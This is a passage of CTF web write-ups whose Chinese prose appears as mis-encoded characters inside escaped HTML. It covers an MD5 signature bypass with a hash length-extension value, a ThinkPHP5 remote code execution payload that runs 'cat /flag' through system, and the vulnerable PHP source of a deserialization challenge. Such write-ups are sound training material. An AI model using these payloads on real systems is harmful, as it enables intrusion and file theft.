hashlib.md5(content).hexdigest()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;waf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;param&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;    check=param.strip().lower()&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;gopher&amp;quot;&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;or&lt;/span&gt; check.startswith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file&amp;quot;&lt;/span&gt;):&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;True&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;br&gt;    app.debug = &lt;span class=&#34;hljs-literal&#34;&gt;False&lt;/span&gt;&lt;br&gt;    app.run(host=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;0.0.0.0&amp;#x27;&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å¯¹æ–‡ä»¶æ‰§è¡Œæ“ä½œçš„æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ª scanï¼Œä¸€ä¸ª readï¼Œscan æŠŠæ–‡ä»¶å†™é“ resault.txtï¼Œè€Œ read å¯ä»¥è¯»æ–‡ä»¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½†æ˜¯è¦å®ç°è¯»å†™æ–‡ä»¶å°±è¦çªç ´ hash çš„éªŒè¯ã€‚è¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªæ–¹æ³•æ¥çªç ´éªŒè¯ï¼Œä¸€ä¸ªæ˜¯é€šè¿‡æœ¬èº«çš„ä»£ç æ¥ç»•è¿‡ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯é€šè¿‡ hashpumpy å·¥å…·æ¥ç»•è¿‡&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šè¿‡æœ¬èº«ä»£ç ç»•è¿‡ï¼š
&lt;ol&gt;
&lt;li&gt;å› ä¸ºåˆ¤æ–­æ˜¯ scan è¿˜æ˜¯ read æ“ä½œç”¨çš„æ˜¯ &lt;code&gt;in&lt;/code&gt;  è€Œä¸æ˜¯ &lt;code&gt;=&lt;/code&gt; , æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ scanread å®ç°åŒæ—¶æ“ä½œ&lt;/li&gt;
&lt;li&gt;å“ˆå¸Œåˆ¤æ–­ï¼š &lt;code&gt;md5(secert_key+param+action)&lt;/code&gt; ,secert_key æ˜¯å›ºå®šçš„ï¼Œparam å’Œ action å¯æ§ï¼Œè€Œ &lt;code&gt;/geneSign&lt;/code&gt;  å¯ä»¥æ‹¿åˆ°åŠ å¯†åçš„ hash å€¼ï¼Œå½“æˆ‘ä»¬ä¼ å…¥ param=flag.txtread æ—¶ï¼Œç­‰å¼å·¦è¾¹ç­‰äº &lt;code&gt;md5(secert_key+&#39;flag.txtread&#39;+&#39;scan&#39;)&lt;/code&gt; , ç„¶åæˆ‘ä»¬è®¿é—® &lt;code&gt;/De1ta&lt;/code&gt;  æ—¶ param=flag.txt&amp;amp;action=readscan, æ­¤æ—¶ä¸¤ä¸ª md5 å€¼ç›¸ç­‰ä¹Ÿå°±ç»•è¿‡äº†éªŒè¯ï¼ŒæŠŠç¬¬ä¸€æ­¥å¾—åˆ°çš„ hash ä¼ å…¥ç¬¬äºŒéƒ¨å³å¯æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;åˆ©ç”¨å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡» hashpumpy å·¥å…·ç»•è¿‡
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;hashpumpy.hashpump(&#39;a36a5ba0e8b9bb78094cbdb641007508&#39;, &#39;scan&#39;, &#39;read&#39;, 24)&lt;/code&gt; =&amp;gt; &lt;code&gt;(&#39;ca08c49a467b1e8b465aa6acb96f20f1&#39;, &#39;scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¼ å…¥ param=flag.txtï¼Œaction=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00% e0%00%00%00%00%00%00%00readï¼Œsing=ca08c49a467b1e8b465aa6acb96f20f1 å³å¯æ‹¿åˆ° flag&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf-2ndold-hack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf-2ndold-hack&#34;&gt;#&lt;/a&gt; [BJDCTF 2nd]old-hack&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æ‰“å¼€ç½‘ç«™æç¤º THINKPHP5&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/nongchaoer/p/12029478.html&#34;&gt;https://www.cnblogs.com/nongchaoer/p/12029478.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æµ‹è¯• payloadï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight oxygene&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs oxygene&#34;&gt;POST ?s=xxx&lt;br&gt;&lt;br&gt;&lt;br&gt;_method=__construct&amp;amp;filter[]=system&amp;amp;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;hljs-title&#34;&gt;get&lt;/span&gt;&amp;amp;&lt;span class=&#34;hljs-title&#34;&gt;server&lt;/span&gt;[&lt;span class=&#34;hljs-title&#34;&gt;REQUEST_METHOD&lt;/span&gt;]=&lt;span class=&#34;hljs-title&#34;&gt;cat&lt;/span&gt; /&lt;span class=&#34;hljs-title&#34;&gt;flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz&#34;&gt;#&lt;/a&gt; [ç½‘é¼æ¯ 2020 é’é¾™ç»„] AreUSerialz&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;highlight_file(&lt;span class=&#34;hljs-keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;FileHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt;;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$op&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/tmp/tmpfile&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hello World!&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;process&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;write();&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;read();&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Bad Hacker!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;write&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(strlen((&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content) &amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Too long!&amp;quot;&lt;/span&gt;);&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_put_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Successful!&amp;quot;&lt;/span&gt;);&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;output(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Failed!&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;read&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt; = file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;filename);&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$res&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;output&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op === &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;op = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;content = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;process();&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;is_valid&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt; &amp;lt; strlen(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;); &lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;++)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(!(ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;gt;= &lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt; &amp;amp;&amp;amp; ord(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;[&lt;span class=&#34;hljs-variable&#34;&gt;$i&lt;/span&gt;]) &amp;lt;= &lt;span class=&#34;hljs-number&#34;&gt;125&lt;/span&gt;))&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;&amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;&amp;#125;)) &amp;#123;&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt; = (&lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;)&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(is_valid(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;)) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$obj&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$str&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ååºåˆ—åŒ–çš„é¢˜ç›®ï¼Œå¯»æ‰¾ POP é“¾&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
